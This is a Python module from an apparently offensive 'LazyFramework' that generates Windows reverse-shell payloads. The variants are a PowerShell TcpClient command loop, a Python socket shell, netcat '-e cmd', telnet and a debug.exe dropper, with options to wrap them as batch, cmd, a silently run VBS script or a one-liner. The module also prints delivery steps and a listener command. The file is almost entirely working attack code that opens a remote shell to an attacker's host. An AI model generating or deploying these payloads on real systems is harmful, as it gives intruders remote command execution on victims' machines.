# /root/lazy1/modules/payloads/reverse/windows/batch_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Windows Batch Reverse TCP",
    "description": "CMD batch file reverse shell with multiple delivery methods",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Windows", 
    "arch": "x86/x64",
    "rank": "Good",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "4444"
    },
    "method": {
        "description": "Execution method",
        "required": False,
        "default": "powershell",
        "choices": ["powershell", "python", "nc", "telnet", "debug"]
    },
    "output": {
        "description": "Output format",
        "required": False,
        "default": "bat",
        "choices": ["bat", "cmd", "vbs", "one-liner"]
    }
}

def generate_batch_reverse(lhost, lport, method="powershell", output="bat"):
    """Generate batch reverse shell"""
    
    payloads = {
        "powershell": f'''@echo off
set "cmd=powershell -nop -c "$c=New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()""
%cmd%''',
        
        "python": f'''@echo off
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd','/q'])"''',
        
        "nc": f'''@echo off
nc -e cmd {lhost} {lport}''',
        
        "telnet": f'''@echo off
telnet {lhost} {lport}''',
        
        "debug": f'''@echo off
echo n reverse.txt> script.txt
echo.>> script.txt
echo e 0100  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00>> script.txt
echo ...>> script.txt
debug < script.txt
reverse.txt'''
    }
    
    payload = payloads.get(method, payloads["powershell"])
    
    # Format output
    if output == "cmd":
        return f'cmd.exe /c "{payload}"'
    elif output == "vbs":
        vbs_wrapper = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c {payload}", 0, False
'''
        return vbs_wrapper
    elif output == "one-liner":
        return payload.replace('\n', ' && ')
    
    return payload

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    method = options.get("method", "powershell")
    output = options.get("output", "bat")
    
    console.print("\n[bold green]🔄 Windows Batch Reverse TCP[/bold green]")
    console.print("=" * 50)
    
    payload = generate_batch_reverse(lhost, lport, method, output)
    
    # Display information
    info_table = Table(show_header=False, box=box.SIMPLE)
    info_table.add_column("Property", style="cyan")
    info_table.add_column("Value", style="white")
    
    info_table.add_row("Listener", f"{lhost}:{lport}")
    info_table.add_row("Platform", "Windows")
    info_table.add_row("Method", method)
    info_table.add_row("Output", output)
    
    console.print(info_table)
    
    console.print(f"\n[bold yellow]📦 Generated Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="green"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    if output == "bat":
        console.print("1. Save as .bat file")
        console.print("2. Double-click or run from cmd")
    elif output == "cmd":
        console.print("1. Copy entire command")
        console.print("2. Paste in cmd.exe")
    elif output == "vbs":
        console.print("1. Save as .vbs file")
        console.print("2. Double-click to run silently")
    
    console.print(f"\n[bold blue]🎯 Listener:[/bold blue] nc -lnvp {lport}")
    
    return payload
